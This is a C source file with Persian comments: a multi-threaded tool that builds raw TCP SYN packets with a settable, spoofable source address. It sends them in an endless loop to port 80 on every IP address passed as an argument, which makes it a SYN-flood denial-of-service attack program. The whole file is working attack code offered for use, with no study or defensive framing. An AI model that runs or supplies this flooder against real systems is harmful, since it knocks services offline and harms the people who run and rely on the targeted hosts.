#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <unistd.h>

#define BUFFER_SIZE 1024
#define THREAD_COUNT 10
#define MAX_IPS 100

// ساخت هدر TCP
struct pseudo_header {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
};

// محاسبه checksum
unsigned short calculate_checksum(unsigned short *ptr, int nbytes) {
    unsigned long sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        sum += *(unsigned char *)ptr;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// ارسال بسته‌ها به IP مشخص
void *send_packets(void *arg) {
    char **target_ips = (char **)arg;
    int raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    if (raw_socket < 0) {
        perror("خطا در ایجاد سوکت");
        pthread_exit(NULL);
    }

    // تنظیم گزینه IP_HDRINCL برای ارسال بسته‌های خام
    int optval = 1;
    if (setsockopt(raw_socket, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) < 0) {
        perror("خطا در تنظیم IP_HDRINCL");
        close(raw_socket);
        pthread_exit(NULL);
    }

    // افزایش سایز بافر ارسال برای جلوگیری از خطای "No buffer space available"
    int sndbuf_size = 1024 * 1024; // 1MB
    if (setsockopt(raw_socket, SOL_SOCKET, SO_SNDBUF, &sndbuf_size, sizeof(sndbuf_size)) < 0) {
        perror("خطا در تنظیم SO_SNDBUF");
        close(raw_socket);
        pthread_exit(NULL);
    }

    char packet[BUFFER_SIZE];
    memset(packet, 0, BUFFER_SIZE);

    struct iphdr *ip_header = (struct iphdr *)packet;
    struct tcphdr *tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));

    ip_header->ihl = 5;
    ip_header->version = 4;
    ip_header->tos = 0;
    ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    ip_header->id = htonl(rand() % 65535);
    ip_header->frag_off = 0;
    ip_header->ttl = 64;
    ip_header->protocol = IPPROTO_TCP;
    ip_header->saddr = inet_addr("192.168.1.100"); // تغییر به IP مبدا دلخواه

    tcp_header->source = htons(rand() % 65535);
    tcp_header->dest = htons(80);
    tcp_header->seq = htonl(rand());
    tcp_header->ack_seq = 0;
    tcp_header->doff = 5; // اندازه هدر TCP
    tcp_header->syn = 1; // بسته SYN برای شروع اتصال
    tcp_header->window = htons(5840);

    while (1) {
        for (int i = 0; target_ips[i] != NULL; i++) {
            struct sockaddr_in target_addr;
            target_addr.sin_family = AF_INET;
            target_addr.sin_port = htons(80);
            inet_pton(AF_INET, target_ips[i], &target_addr.sin_addr);

            tcp_header->check = 0;
            ip_header->check = 0;

            ip_header->id = htonl(rand() % 65535);
            ip_header->daddr = target_addr.sin_addr.s_addr;
            ip_header->check = calculate_checksum((unsigned short *)ip_header, sizeof(struct iphdr));

            struct pseudo_header psh;
            psh.source_address = ip_header->saddr;
            psh.dest_address = target_addr.sin_addr.s_addr;
            psh.placeholder = 0;
            psh.protocol = IPPROTO_TCP;
            psh.tcp_length = htons(sizeof(struct tcphdr));

            char pseudo_packet[sizeof(struct pseudo_header) + sizeof(struct tcphdr)];
            memcpy(pseudo_packet, &psh, sizeof(struct pseudo_header));
            memcpy(pseudo_packet + sizeof(struct pseudo_header), tcp_header, sizeof(struct tcphdr));

            tcp_header->check = calculate_checksum((unsigned short *)pseudo_packet, sizeof(pseudo_packet));

            if (sendto(raw_socket, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
                perror("خطا در ارسال بسته");
            } else {
                printf("بسته TCP به %s ارسال شد.\n", target_ips[i]);
            }

            // اضافه کردن تاخیر برای جلوگیری از فشار بیش از حد به سیستم
            usleep(10000); // 10 میلی‌ثانیه تاخیر
        }
    }

    close(raw_socket);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("استفاده: %s <آدرس IP مقصد 1> <آدرس IP مقصد 2> ...\n", argv[0]);
        return 1;
    }

    pthread_t threads[THREAD_COUNT];

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_create(&threads[i], NULL, send_packets, argv + 1);
    }

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
